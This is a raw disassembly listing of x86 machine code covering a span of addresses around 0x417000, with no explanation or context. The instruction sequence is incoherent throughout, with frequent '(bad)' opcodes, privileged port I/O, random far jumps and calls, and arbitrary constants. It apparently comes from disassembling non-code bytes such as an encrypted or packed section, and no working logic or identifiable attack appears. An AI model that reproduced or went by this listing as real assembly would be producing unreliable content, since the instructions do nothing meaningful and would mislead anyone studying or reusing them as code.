  4170fc:	jns    0x41708d
  4170fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170ff:	cmp    BYTE PTR [ecx-0x7270f081],ah
  417105:	mov    al,0xf0
  417107:	mov    eax,0xb2f2557e
  41710c:	mov    cl,0xea
  41710e:	push   es
  41710f:	cdq    
  417110:	cmp    edx,DWORD PTR [esi-0x7e]
  417113:	hlt    
  417114:	stc    
  417115:	ja     0x417098
  417117:	fwait
  417118:	add    DWORD PTR [ecx],edi
  41711a:	add    BYTE PTR [edi],ch
  41711c:	je     0x4170b7
  41711e:	xchg   ebx,eax
  41711f:	jle    0x4170be
  417121:	stos   BYTE PTR es:[edi],al
  417122:	cli    
  417123:	pop    es
  417124:	sbb    BYTE PTR [ebp-0x4430a46b],ah
  41712a:	popf   
  41712b:	mov    ebp,edx
  41712d:	inc    edi
  41712e:	xchg   BYTE PTR [ebx+0x4356bc37],cl
  417134:	cmp    cl,BYTE PTR [edi]
  417136:	xor    al,0x3e
  417138:	icebp  
  417139:	push   esp
  41713a:	push   esp
  41713b:	lods   al,BYTE PTR ds:[esi]
  41713c:	sbb    DWORD PTR [ebx-0x69],0x49ff549f
  417143:	and    edi,DWORD PTR [edi-0x10]
  417146:	push   ebx
  417147:	mov    edi,0xfd477e7b
  41714c:	fistp  QWORD PTR [edx]
  41714e:	ror    DWORD PTR [ecx+0x5b23e4b2],0xd3
  417155:	cmp    edx,ecx
  417157:	inc    edx
  417158:	call   0x18608748
  41715d:	mov    eax,0x96164ec5
  417162:	outs   dx,BYTE PTR ds:[esi]
  417163:	add    DWORD PTR [edx+eax*4+0x1c],edi
  417167:	and    al,0x4a
  417169:	sbb    DWORD PTR [edx+0x397c0cbc],edi
  41716f:	call   0xe571:0x725b0972
  417176:	daa    
  417177:	leave  
  417178:	in     al,dx
  417179:	xor    eax,0x6dbc077b
  41717e:	out    0x43,al
  417180:	fadd   QWORD PTR [edx]
  417182:	push   ds
  417183:	pushf  
  417184:	popa   
  417185:	pushf  
  417186:	into   
  417187:	aaa    
  417188:	and    al,0x39
  41718a:	mov    bl,0xc3
  41718c:	mov    esp,0x16009c19
  417191:	and    eax,0x4f29d2a1
  417196:	mov    edx,0x16b74b9e
  41719b:	std    
  41719c:	jg     0x41720b
  41719e:	cld    
  41719f:	cmp    eax,DWORD PTR ds:0x772cbab6
  4171a5:	push   esi
  4171a6:	aam    0x56
  4171a8:	mov    ebx,0x894938b2
  4171ad:	cs inc esp
  4171af:	push   ss
  4171b0:	inc    ebx
  4171b1:	mov    eax,ds:0x132740bc
  4171b6:	push   ds
  4171b7:	aaa    
  4171b8:	xor    al,0xed
  4171ba:	sti    
  4171bb:	clc    
  4171bc:	imul   ecx,DWORD PTR [esi-0x11f98428],0x41c9cafa
  4171c6:	cdq    
  4171c7:	sub    bl,BYTE PTR [eax-0x318c6239]
  4171cd:	push   DWORD PTR [edi+eax*2-0x39]
  4171d1:	mov    ch,0x59
  4171d3:	fst    QWORD PTR [edx+0x69]
  4171d6:	or     al,0x1e
  4171d8:	call   FWORD PTR [eax-0x321209d0]
  4171de:	push   eax
  4171df:	addr16 mov esi,0x350e4ef7
  4171e5:	or     dl,BYTE PTR [esi-0x338bd285]
  4171eb:	fwait
  4171ec:	pop    ebp
  4171ed:	push   ss
  4171ee:	push   ebx
  4171ef:	and    bh,BYTE PTR [ebp+0x5eb156e0]
  4171f5:	retf   
  4171f6:	adc    dh,BYTE PTR [edx-0x6a]
  4171f9:	sub    dl,bh
  4171fb:	in     eax,dx
  4171fc:	call   0xf11c56f9
  417201:	cmp    DWORD PTR [ecx],0xffffff9e
  417204:	adc    ebp,DWORD PTR [eax]
  417206:	jge    0x4171ed
  417208:	fld    st(3)
  41720a:	pop    DWORD PTR [edx+0x13]
  41720d:	stos   DWORD PTR es:[edi],eax
  41720e:	nop
  41720f:	add    ah,BYTE PTR [ecx+0x45]
  417212:	std    
  417213:	ins    BYTE PTR es:[edi],dx
  417214:	les    esp,FWORD PTR [eax]
  417216:	sub    bl,al
  417218:	sbb    al,al
  41721a:	aam    0xef
  41721c:	jae    0x4171e6
  41721e:	mov    al,0xbb
  417220:	mov    eax,ds:0x8eb4d313
  417225:	xor    BYTE PTR [edi],al
  417227:	sub    eax,0xa95c5fa3
  41722c:	js     0x417281
  41722e:	test   bh,ch
  417230:	ss adc bh,dl
  417233:	lea    esp,[edi-0x17]
  417236:	inc    ebx
  417237:	push   ss
  417238:	(bad)  
  417239:	mov    esi,DWORD PTR [eax]
  41723b:	in     eax,0x54
  41723d:	mov    edx,0x4e861f25
  417242:	lods   al,BYTE PTR ds:[esi]
  417243:	fs (bad) 
  417245:	dec    ebx
  417246:	pop    ebx
  417247:	rol    BYTE PTR [esi-0x68bb48c8],0xe2
  41724e:	mov    ds:0x4cdf3d56,al
  417253:	and    eax,DWORD PTR [esi+ebx*4-0x16ff1deb]
  41725a:	aas    
  41725b:	dec    eax
  41725c:	sub    DWORD PTR [edx-0x2f7947b],esp
  417262:	hlt    
  417263:	jmp    0xf24b44fc
  417268:	mov    esi,0xffd80fe4
  41726d:	xchg   ecx,eax
  41726e:	pop    eax
  41726f:	inc    edx
  417270:	or     dh,BYTE PTR [ebx]
  417272:	mov    al,bl
  417274:	jmp    DWORD PTR [edx]
  417276:	cmp    DWORD PTR [esi],0xc00c8f45
  41727c:	pop    es
  41727d:	gs ja  0x417235
  417280:	mov    edi,0x53965b5e
  417285:	mov    esp,0xbb44b5f0
  41728a:	fwait
  41728b:	int3   
  41728c:	stos   BYTE PTR es:[edi],al
  41728d:	int    0xfe
  41728f:	retf   0x1dd9
  417292:	test   BYTE PTR [edx+0x4837a3c4],dh
  417298:	(bad)  
  417299:	jp     0x4172f4
  41729b:	add    eax,DWORD PTR [eax+0x775b0dd8]
  4172a1:	daa    
  4172a2:	imul   eax,DWORD PTR [edi-0x51],0x7b
  4172a6:	outs   dx,BYTE PTR ds:[esi]
  4172a7:	mov    dh,0x21
  4172a9:	jge    0x417264
  4172ab:	pop    eax
  4172ac:	dec    esp
  4172ad:	xor    eax,0xc38cc566
  4172b2:	fmul   QWORD PTR [ebx]
  4172b4:	retf   
  4172b5:	jbe    0x4172b5
  4172b7:	mov    cl,0x88
  4172b9:	ror    BYTE PTR [ebx],cl
  4172bb:	pop    eax
  4172bc:	adc    bl,ch
  4172be:	sti    
  4172bf:	sbb    BYTE PTR ds:0xd6446da0,dh
  4172c5:	imul   esi,DWORD PTR [ecx],0x6ac0b74
  4172cb:	ret    0x956
  4172ce:	retf   0x33f7
  4172d1:	pop    esp
  4172d2:	or     eax,DWORD PTR [edx]
  4172d4:	cmp    esp,DWORD PTR [eax]
  4172d6:	mov    bh,bl
  4172d8:	xor    al,al
  4172da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172dc:	cld    
  4172dd:	es xor al,0xea
  4172e0:	loopne 0x417293
  4172e2:	pop    ds
  4172e3:	cmp    eax,0x50f33305
  4172e8:	mov    edx,0x7d3a13c9
  4172ed:	shl    DWORD PTR [esi+eiz*1+0x77b63462],0xf6
  4172f5:	pop    ds
  4172f6:	in     eax,0x43
  4172f8:	push   edi
  4172f9:	jle    0x4172e9
  4172fb:	sbb    al,0x1e
  4172fd:	mov    cl,0x9d
  4172ff:	add    ah,BYTE PTR [ebp-0x292627cb]
  417305:	sbb    DWORD PTR [ebx+0x44],ebp
  417308:	mov    cl,0x9a
  41730a:	and    BYTE PTR [esi],bl
  41730c:	jp     0x4172f7
  41730e:	lods   al,BYTE PTR ds:[esi]
  41730f:	push   ebx
  417310:	xchg   ebp,eax
  417311:	jp     0x4172ea
  417313:	ss push ebx
  417315:	cmp    DWORD PTR [edi-0x19a14dfe],esp
  41731b:	inc    ebx
  41731c:	pop    edi
  41731d:	mov    bl,0xe
  41731f:	lods   al,BYTE PTR ds:[esi]
  417320:	dec    DWORD PTR [ebp+0x479e9d82]
  417326:	in     al,0x6b
  417328:	xlat   BYTE PTR ds:[ebx]
  417329:	and    eax,0x3c43b93
  41732e:	aam    0xd1
  417330:	inc    ecx
  417331:	shl    BYTE PTR [ebp-0x30],0x41
  417335:	xor    eax,0xc545c12
  41733a:	pop    ds
  41733b:	inc    esp
  41733c:	mov    eax,ds:0xdf8bff2
  417341:	or     al,0x94
  417343:	push   ebp
  417344:	leave  
  417345:	nop
  417346:	dec    edx
  417347:	jmp    0x1434:0x533c860c
  41734e:	jns    0x417392
  417350:	dec    ebx
  417351:	mov    esp,eax
  417353:	into   
  417354:	pop    esp
  417355:	add    BYTE PTR [edi+0xd395e2f],0xdc
  41735c:	inc    edi
  41735d:	pusha  
  41735e:	in     al,0x18
  417360:	nop
  417361:	add    al,0x3
  417363:	mov    eax,0x1422be34
  417368:	lods   al,BYTE PTR ds:[esi]
  417369:	jno    0x417333
  41736b:	add    ch,BYTE PTR [ecx]
  41736d:	add    ch,cl
  41736f:	inc    edx
  417370:	pop    es
  417371:	xor    bh,bh
  417373:	dec    eax
  417374:	sti    
  417375:	aas    
  417376:	cdq    
  417377:	cmp    eax,eax
  417379:	mul    BYTE PTR [edx]
  41737b:	fwait
  41737c:	pop    ss
  41737d:	push   ds
  41737e:	nop
  41737f:	jmp    0x417311
  417381:	call   0x4dcb:0x96b827da
  417388:	adc    edx,edi
  41738a:	sub    al,0x64
  41738c:	mov    ch,0x2e
  41738e:	xchg   DWORD PTR [ebx+0x4b],edi
  417391:	ins    DWORD PTR es:[edi],dx
  417392:	push   ebp
  417393:	daa    
  417394:	mov    bl,0x7f
  417396:	icebp  
  417397:	xchg   esi,eax
  417398:	in     al,0x69
  41739a:	adc    eax,0x958db45b
  41739f:	sub    BYTE PTR [ebp+eiz*1+0x7d1757db],dh
  4173a6:	adc    al,dl
  4173a8:	repz mov dh,0x7b
  4173ab:	lock sahf 
  4173ad:	or     bl,BYTE PTR [ecx-0x32c2ffe4]
  4173b3:	or     DWORD PTR [esi+0x0],edx
  4173b6:	sub    eax,0x410f25c4
  4173bb:	sbb    DWORD PTR [esi],ecx
  4173bd:	jb     0x417436
  4173bf:	pop    ecx
  4173c0:	adc    BYTE PTR [edi+0x25],cl
  4173c3:	cld    
  4173c4:	and    esi,DWORD PTR [ebx+ecx*4+0x23670ef8]
  4173cb:	push   ss
  4173cc:	sub    BYTE PTR [edi],bh
  4173ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173cf:	cmp    DWORD PTR [esi+0x6931c066],0xbe9ca8fe
  4173d9:	rcl    DWORD PTR [ebx-0x7a088466],cl
  4173df:	sbb    eax,0xdad62335
  4173e4:	sub    DWORD PTR [ecx-0x32],eax
  4173e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e8:	add    eax,0x6d878c26
  4173ed:	fidivr DWORD PTR [edx]
  4173ef:	test   al,0xa2
  4173f1:	sbb    al,0x3
  4173f3:	das    
  4173f4:	adc    ebp,edi
  4173f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f7:	jle    0x417471
  4173f9:	clc    
  4173fa:	aam    0xc6
  4173fc:	int3   
  4173fd:	out    dx,eax
  4173fe:	and    ebx,DWORD PTR [esp+edi*8+0x416dbd33]
  417405:	jno    0x4173a0
  417407:	pusha  
  417408:	xlat   BYTE PTR ds:[ebx]
  417409:	inc    ebx
  41740a:	fldcw  WORD PTR [edx+0x56]
  41740d:	sbb    DWORD PTR [ebp+0x20a6e049],esi
  417413:	mov    bh,0xe1
  417415:	xchg   ecx,eax
  417416:	test   DWORD PTR [ebx+edx*2+0x6b],0xbb300d84
  41741e:	sbb    ebp,0x6e
  417421:	repz or esi,ebx
  417424:	das    
  417425:	shl    BYTE PTR [ebx],1
  417427:	xchg   ecx,eax
  417428:	add    DWORD PTR [ebx],ebp
  41742a:	fsubrp st(2),st
  41742c:	adc    ah,BYTE PTR [ebx-0x2fc0f36e]
  417432:	dec    ebx
  417433:	aam    0xe
  417435:	adc    cl,BYTE PTR [edi-0x3626c213]
  41743b:	int    0xbf
  41743d:	xor    dh,BYTE PTR [eax]
  41743f:	jae    0x417431
  417441:	lahf   
  417442:	or     ecx,DWORD PTR fs:[ebx+eiz*2+0x349810ff]
  41744a:	inc    esp
  41744b:	jge    0x417492
  41744d:	add    esi,ecx
  41744f:	nop
  417450:	jle    0x4173f7
  417452:	push   0x582cbc68
  417457:	adc    ch,BYTE PTR [edi+0x40]
  41745a:	repz mov ds:0xc2c30e2d,eax
  417460:	inc    esp
  417461:	call   0x27500534
  417466:	cmc    
  417467:	ja     0x417476
  417469:	icebp  
  41746a:	out    0x72,al
  41746c:	mov    dl,0x79
  41746e:	in     al,dx
  41746f:	xchg   ecx,eax
  417470:	mov    esi,0x46e8806e
  417475:	sub    BYTE PTR [ebx-0x38],ch
  417478:	jle    0x41742d
  41747a:	(bad)  
  41747b:	fild   QWORD PTR [edi]
  41747d:	xor    eax,0x45b21875
  417482:	mov    cl,0x94
  417484:	pop    ebp
  417485:	add    edi,DWORD PTR [edi]
  417487:	sbb    dl,0x89
  41748a:	push   ss
  41748b:	or     edi,ebp
  41748d:	scas   al,BYTE PTR es:[edi]
  41748e:	je     0x417503
  417490:	in     al,dx
  417491:	mov    bh,0x15
  417493:	mov    dl,0xe3
  417495:	pop    eax
  417496:	iret   
  417497:	dec    edi
  417498:	es xchg esp,eax
  41749a:	sub    ecx,DWORD PTR [ecx+0x16]
  41749d:	xchg   bh,ch
  41749f:	aam    0x64
  4174a1:	out    dx,al
  4174a2:	(bad)  
  4174a3:	mov    ebp,eax
  4174a5:	jp     0x41750f
  4174a7:	loopne 0x417458
  4174a9:	gs ins DWORD PTR es:[edi],dx
  4174ab:	sbb    DWORD PTR [eax],0x16c57e32
  4174b1:	test   eax,esp
  4174b3:	jnp    0x41747b
  4174b5:	pop    es
  4174b6:	xlat   BYTE PTR ds:[ebx]
  4174b7:	mov    cs,WORD PTR [ebx-0x61]
  4174ba:	rcl    DWORD PTR gs:[esi+0x4c],cl
  4174be:	lods   eax,DWORD PTR ds:[esi]
  4174bf:	fadd   QWORD PTR [edx]
  4174c1:	mov    eax,ds:0x99d99b87
  4174c6:	imul   ecx,DWORD PTR [esp+edi*1-0x18],0x10
  4174cb:	daa    
  4174cc:	clc    
  4174cd:	js     0x417492
  4174cf:	sbb    DWORD PTR [edi],esi
  4174d1:	ja     0x417466
  4174d3:	gs lahf 
  4174d5:	mov    ebx,DWORD PTR [eax]
  4174d7:	cmc    
  4174d8:	aad    0xa
  4174da:	pushf  
  4174db:	add    eax,0xe2336331
  4174e0:	and    edi,DWORD PTR [ecx-0x5922abe]
  4174e6:	dec    esp
  4174e7:	push   ecx
  4174e8:	and    DWORD PTR [ebp-0x58ffaa96],esp
  4174ee:	adc    esp,ebx
  4174f0:	iret   
  4174f1:	test   al,0xfe
  4174f3:	fcmovne st,st(4)
  4174f5:	cmp    BYTE PTR [edi],bh
  4174f7:	lods   al,BYTE PTR ds:[esi]
  4174f8:	xchg   edx,eax
  4174f9:	xor    cl,BYTE PTR [ebp-0xd]
  4174fc:	sbb    BYTE PTR [ecx-0x6731c01c],cl
  417502:	std    
  417503:	aad    0x36
  417505:	cmp    dl,bl
  417507:	jb     0x41752b
  417509:	xchg   esp,eax
  41750a:	(bad)  
  41750b:	or     eax,0x49179808
  417510:	ss jae 0x4174fd
  417513:	push   es
  417514:	adc    esp,eax
  417516:	mov    ah,0xda
  417518:	xor    eax,0xcf807109
  41751d:	mov    eax,0xf02d63bd
  417522:	jp     0x4174d2
  417524:	xor    dh,BYTE PTR [esi]
  417526:	xchg   esi,eax
  417527:	mov    BYTE PTR [edx],dh
  417529:	shr    DWORD PTR [esi+0x7c77ab35],0x96
  417530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417531:	mov    ebx,0x7f0ee3a1
  417536:	clc    
  417537:	stos   BYTE PTR es:[edi],al
  417538:	cmc    
  417539:	xchg   edi,eax
  41753a:	int3   
  41753b:	push   0x28
  41753d:	mov    DWORD PTR [ebx+0x3f],eax
  417540:	adc    eax,0x826b3842
  417545:	fcmove st,st(2)
  417547:	mov    eax,DWORD PTR [ebp-0x5e0244b6]
  41754d:	lea    ecx,[ecx-0x19014067]
  417553:	adc    ecx,DWORD PTR [edi+0x3a]
  417556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417557:	pop    ebx
  417558:	les    ebx,FWORD PTR ds:0xd9f90237
  41755e:	and    BYTE PTR [esp+ecx*8],cl
  417561:	mov    bh,0x37
  417563:	in     al,0xe0
  417565:	inc    edi
  417566:	or     DWORD PTR [ebx+0x39d03c57],edx
  41756c:	xchg   BYTE PTR [edx],bl
  41756e:	cdq    
  41756f:	mov    esp,0x2709b09
  417574:	inc    esi
  417575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417576:	jb     0x417562
  417578:	mov    bh,0xd6
  41757a:	in     eax,dx
  41757b:	dec    ebp
  41757c:	cmc    
  41757d:	or     ah,BYTE PTR [eax]
  41757f:	shr    BYTE PTR ds:0x15e633a2,cl
  417585:	mov    ds:0xa8d8d56f,eax
  41758a:	div    eax
  41758c:	test   DWORD PTR [ecx-0xd3b993],ecx
  417592:	stos   BYTE PTR es:[edi],al
  417593:	dec    eax
  417594:	jns    0x4175fa
  417596:	jae    0x417557
  417598:	mov    edx,0x89a6f835
  41759d:	jmp    0xa3cb9333
  4175a2:	test   eax,0x4d99a547
  4175a7:	add    dl,BYTE PTR [esi+0x1d1e3daa]
  4175ad:	out    0xd6,al
  4175af:	clc    
  4175b0:	stos   BYTE PTR es:[edi],al
  4175b1:	test   BYTE PTR [ebx+eiz*4],al
  4175b4:	push   esp
  4175b5:	adc    BYTE PTR [ecx],dl
  4175b7:	mov    ecx,0x34a4e2dc
  4175bc:	inc    ecx
  4175bd:	test   eax,0x3f7a3deb
  4175c2:	repnz iret 
  4175c4:	jge    0x4175df
  4175c6:	push   ds
  4175c7:	mov    edx,0x7781b5ef
  4175cc:	or     eax,0xe1229d04
  4175d1:	je     0x417650
  4175d3:	mov    ch,0x6f
  4175d5:	mov    ebp,0xb004d79
  4175da:	in     al,dx
  4175db:	cmp    eax,0x804ebe2d
  4175e0:	mov    DWORD PTR [edx],ecx
  4175e2:	pop    ecx
  4175e3:	leave  
  4175e4:	add    eax,0x3afe0ad5
  4175e9:	pushf  
  4175ea:	neg    BYTE PTR [edx+0x71]
  4175ed:	cmp    ch,cl
  4175ef:	inc    esi
  4175f0:	mov    BYTE PTR [ebp-0x2b],ch
  4175f3:	retf   
  4175f4:	lahf   
  4175f5:	in     eax,0x13
  4175f7:	and    eax,0x3808c02a
  4175fc:	xchg   esp,edx
  4175fe:	jg     0x41765d
  417600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417601:	je     0x417613
  417603:	(bad)  
  417604:	in     al,0xdb
  417606:	sbb    dh,BYTE PTR [ecx]
  417608:	cmc    
  417609:	arpl   WORD PTR [ebp+0x1d],ax
  41760c:	(bad)  
  41760d:	dec    DWORD PTR [edi]
  41760f:	sub    ebp,0xfa12a03c
  417615:	fsub   QWORD PTR [edx]
  417617:	lea    esp,[edx-0x26]
  41761a:	jbe    0x4175d1
  41761c:	pop    ss
  41761d:	cdq    
  41761e:	das    
  41761f:	(bad)  
  417620:	mov    ebx,0x1664c323
  417625:	sti    
  417626:	icebp  
  417627:	mov    esi,0x61ac59f7
  41762c:	jmp    0x8c86:0x9a5c4429
  417633:	push   ebx
  417634:	sbb    eax,DWORD PTR [ebx+ecx*1-0x53133ad8]
  41763b:	in     al,dx
  41763c:	cmp    dl,BYTE PTR [esi+0x23]
  41763f:	test   BYTE PTR [esi],cl
  417641:	sti    
  417642:	xchg   edi,eax
  417643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417644:	fdiv   QWORD PTR [ebp+ecx*4+0x75]
  417648:	imul   eax,esi,0x52
  41764b:	lock (bad) 
  41764d:	or     ch,cl
  41764f:	(bad)  
  417650:	scas   al,BYTE PTR es:[edi]
  417651:	jb     0x417623
  417653:	(bad)  
  417654:	imul   edx,DWORD PTR ds:0x3828453a,0xe9dfc572
  41765e:	pushf  
  41765f:	je     0x4176d8
  417661:	dec    edx
  417662:	div    BYTE PTR [eax-0xf]
  417665:	fistp  DWORD PTR [ebx-0x73e6a79a]
  41766b:	or     eax,0x241546d0
  417670:	sbb    dl,al
  417672:	(bad)  
  417673:	rcr    DWORD PTR [ecx+0x7f],1
  417676:	outs   dx,BYTE PTR ds:[esi]
  417677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417678:	xchg   BYTE PTR [ecx+eiz*8],dl
  41767b:	and    al,0x91
  41767d:	or     DWORD PTR fs:[ebx],esp
  417680:	pusha  
  417681:	fsub   DWORD PTR [ebp+0x63]
  417684:	sbb    BYTE PTR [eax],bh
  417686:	sbb    al,0xc1
  417688:	mov    es,WORD PTR [esi]
  41768a:	adc    cl,BYTE PTR [edx+edx*8]
  41768d:	mov    bh,0xfc
  41768f:	mov    al,cl
  417691:	test   DWORD PTR [esi],ebp
  417693:	jno    0x417619
  417695:	mov    dh,0xb7
  417697:	aaa    
  417698:	out    0x14,eax
  41769a:	jge    0x417678
  41769c:	mov    al,ds:0x176ba3c9
  4176a1:	jp     0x4176d4
  4176a3:	fstp   st(3)
  4176a5:	icebp  
  4176a6:	fmul   QWORD PTR [ecx+0x108f59b8]
  4176ac:	sbb    DWORD PTR [eax+0x6fb2a4d1],eax
  4176b2:	sbb    dl,dl
  4176b4:	jbe    0x417657
  4176b6:	(bad)  
  4176b7:	loopne 0x41769b
  4176b9:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4176bb:	(bad)  
  4176bc:	and    DWORD PTR [ecx+edi*8+0x23],0x673c99eb
  4176c4:	adc    ebx,DWORD PTR [eax+ebx*4]
  4176c7:	push   es
  4176c8:	or     BYTE PTR [ecx+0x6e],cl
  4176cb:	cmp    DWORD PTR [edi+0x2e],0x10c6b9ac
  4176d2:	jg     0x417700
  4176d4:	mov    ecx,0xa1674bc7
  4176d9:	add    ebp,DWORD PTR [edx-0x606de3cb]
  4176df:	jns    0x4176d8
  4176e1:	stos   BYTE PTR es:[edi],al
  4176e2:	popa   
  4176e3:	stos   DWORD PTR es:[edi],eax
  4176e4:	mov    bl,0xd1
  4176e6:	sahf   
  4176e7:	jge    0x417673
  4176e9:	jp     0x4176aa
  4176eb:	mov    ?,WORD PTR [edx-0x512a196a]
  4176f1:	daa    
  4176f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176f3:	sbb    ebx,DWORD PTR [esi+0x3b]
  4176f6:	lea    edi,[ecx]
  4176f8:	dec    ecx
  4176f9:	rol    BYTE PTR [eax],1
  4176fb:	stos   DWORD PTR es:[edi],eax
  4176fc:	mov    al,ds:0xcb05b7c7
  417701:	jmp    0xe84:0xded6b15b
  417708:	adc    BYTE PTR [eax+0x3d],cl
  41770b:	int3   
  41770c:	js     0x417704
  41770e:	call   0xed10:0x7ac18fb2
  417715:	mov    al,0x5d
  417717:	jo     0x4176db
  417719:	js     0x4176cb
  41771b:	dec    ebp
  41771c:	pop    es
  41771d:	lods   eax,DWORD PTR ds:[esi]
  41771e:	sub    BYTE PTR [esi+esi*4],ah
  417721:	aam    0xfe
  417723:	les    ebx,FWORD PTR [eax-0x455497f9]
  417729:	mov    ch,0xc4
  41772b:	neg    DWORD PTR [eax+0x60]
  41772e:	pop    esp
  41772f:	in     al,dx
  417730:	cwde   
  417731:	jo     0x4176e0
  417733:	gs push ss
  417735:	gs mov bl,0xe6
  417738:	mov    ebx,0x82abd250
  41773d:	sub    DWORD PTR [esi-0x47],ebp
  417740:	nop
  417741:	int3   
  417742:	lods   eax,DWORD PTR ds:[esi]
  417743:	add    al,BYTE PTR [ecx+0x7f208662]
  417749:	rcr    DWORD PTR [ebx-0x1952e94f],cl
  41774f:	mov    ch,BYTE PTR [ecx+edi*4]
  417752:	into   
  417753:	fnsave [edx+0x22]
  417756:	sbb    ebx,esp
  417758:	ins    DWORD PTR es:[edi],dx
  417759:	xchg   ecx,eax
  41775a:	std    
  41775b:	jb     0x4177ce
  41775d:	mov    DWORD PTR [eax],edi
  41775f:	outs   dx,DWORD PTR ds:[esi]
  417760:	aas    
  417761:	sub    BYTE PTR [eax-0x4b],ah
  417764:	in     eax,dx
  417765:	data16 mov WORD PTR [ebx-0x8ddeae0],cs
  41776c:	scas   eax,DWORD PTR es:[edi]
  41776d:	dec    ecx
  41776e:	retf   
  41776f:	cmp    eax,0xe12ee89
  417774:	xchg   ecx,eax
  417775:	jmp    0xb0a9cb3f
  41777a:	xchg   ebp,eax
  41777b:	jmp    0x4c99:0x57ea9b98
  417782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417783:	and    dl,ah
  417785:	mov    DWORD PTR [ebx+0x29],edx
  417788:	aad    0xe4
  41778a:	ins    BYTE PTR es:[edi],dx
  41778b:	xchg   edi,eax
  41778c:	cmp    al,0xc3
  41778e:	call   0x7b4b:0x36afae7c
  417795:	push   ebx
  417796:	cmp    al,0x38
  417798:	ins    BYTE PTR es:[edi],dx
  417799:	sbb    DWORD PTR [ebx-0x10],edx
  41779c:	(bad)  
  41779d:	fdivr  DWORD PTR [ebx+0x38c704e3]
  4177a3:	or     bh,BYTE PTR [edi]
  4177a5:	out    0xb1,al
  4177a7:	ds (bad) 
  4177a9:	jl     0x41778e
  4177ab:	xor    BYTE PTR [edx+0xf30cc2a],dl
  4177b1:	repnz fwait
  4177b3:	mov    esi,DWORD PTR [ebp-0x6655e9c5]
  4177b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ba:	fwait
  4177bb:	in     eax,0x62
  4177bd:	nop
  4177be:	add    al,BYTE PTR [edi]
  4177c0:	xchg   ecx,eax
  4177c1:	fstp   DWORD PTR [ebx]
  4177c3:	or     eax,0x76f011e9
  4177c8:	shr    BYTE PTR [ecx+edi*8+0x44ea7571],cl
  4177cf:	pop    esi
  4177d0:	imul   ebx,DWORD PTR [ebx],0x1a4f00b6
  4177d6:	mov    cl,0xa0
  4177d8:	int3   
  4177d9:	add    cl,BYTE PTR [esi+0x16387e14]
  4177df:	nop
  4177e0:	addr16 pop es
  4177e2:	inc    ebp
  4177e3:	and    ebx,ecx
  4177e5:	fdivr  DWORD PTR ds:0x181a161b
  4177eb:	retf   0xc552
  4177ee:	push   es
  4177ef:	iret   
  4177f0:	jns    0x417840
  4177f2:	pop    ebx
  4177f3:	push   esi
  4177f4:	cs mov edi,0x7218a56c
  4177fa:	outs   dx,DWORD PTR ds:[esi]
  4177fb:	mov    ch,0x40
  4177fd:	mov    dh,0x87
  4177ff:	mov    eax,0x6b40f2cc
  417804:	inc    ecx
  417805:	loop   0x417825
  417807:	in     al,dx
  417808:	daa    
  417809:	aad    0x4f
  41780b:	mov    dh,0xa2
  41780d:	stos   DWORD PTR es:[edi],eax
  41780e:	pop    ss
  41780f:	pop    ds
  417810:	and    DWORD PTR [edi-0x18f05cb9],eax
  417816:	pop    ds
  417817:	sub    bh,BYTE PTR [esi+0x30]
  41781a:	xor    bl,BYTE PTR [esp+ebp*4-0x62]
  41781e:	xchg   cl,cl
  417820:	stos   DWORD PTR es:[edi],eax
  417821:	test   eax,0x75333431
  417826:	leave  
  417827:	aaa    
  417828:	jbe    0x41785b
  41782a:	sbb    ecx,DWORD PTR [edi]
  41782c:	mov    bl,0xd4
  41782e:	mov    esp,0xc812f139
  417833:	pop    eax
  417834:	mov    edi,0xfd107e95
  417839:	cmp    bl,al
  41783b:	data16 jno 0x41780d
  41783e:	xor    BYTE PTR [eax-0x5f],al
  417841:	loopne 0x4177e2
  417843:	std    
  417844:	jle    0x4178bd
  417846:	adc    bl,bl
  417848:	sbb    al,0xd9
  41784a:	pop    ds
  41784b:	lods   al,BYTE PTR ds:[esi]
  41784c:	jno    0x417873
  41784e:	sub    BYTE PTR [edi-0x3c],0x6e
  417852:	stos   DWORD PTR es:[edi],eax
  417853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417854:	cli    
  417855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417856:	scas   al,BYTE PTR es:[edi]
  417857:	mov    al,ds:0x1f822222
  41785c:	ret    
  41785d:	rol    DWORD PTR [ebp-0x3e],1
  417860:	cmp    DWORD PTR [ebx+0x40],ecx
  417863:	cmp    ch,BYTE PTR [edx]
  417865:	sbb    ch,ch
  417867:	icebp  
  417868:	fcomp  QWORD PTR [edi-0xf82aea9]
  41786e:	pop    esi
  41786f:	push   cs
  417870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417871:	cmc    
  417872:	arpl   WORD PTR [ebx+0x36],cx
  417875:	cmp    ecx,esp
  417877:	shl    BYTE PTR [edi],1
  417879:	adc    ah,dh
  41787b:	aad    0xf6
  41787d:	or     DWORD PTR [esi+0x40519b0d],esp
  417883:	sbb    eax,0x2e80c046
  417888:	(bad)  
  41788b:	push   ebx
  41788c:	sbb    al,0x49
  41788e:	pop    es
  41788f:	lahf   
  417890:	mov    bl,0x7a
  417892:	and    al,0xc
  417894:	mov    ds:0xe3ba78a4,eax
  417899:	or     al,0x9c
  41789b:	xchg   edx,eax
  41789c:	xor    ebx,ebp
  41789e:	not    DWORD PTR [edi-0x66]
  4178a1:	dec    ebp
  4178a2:	lea    edi,[edx]
  4178a4:	lea    esp,[edx]
  4178a6:	xlat   BYTE PTR ds:[ebx]
  4178a7:	call   0xf76b:0x179ecffa
  4178ae:	push   0x7271f715
  4178b3:	ror    DWORD PTR [ebx+0x1cb4151c],1
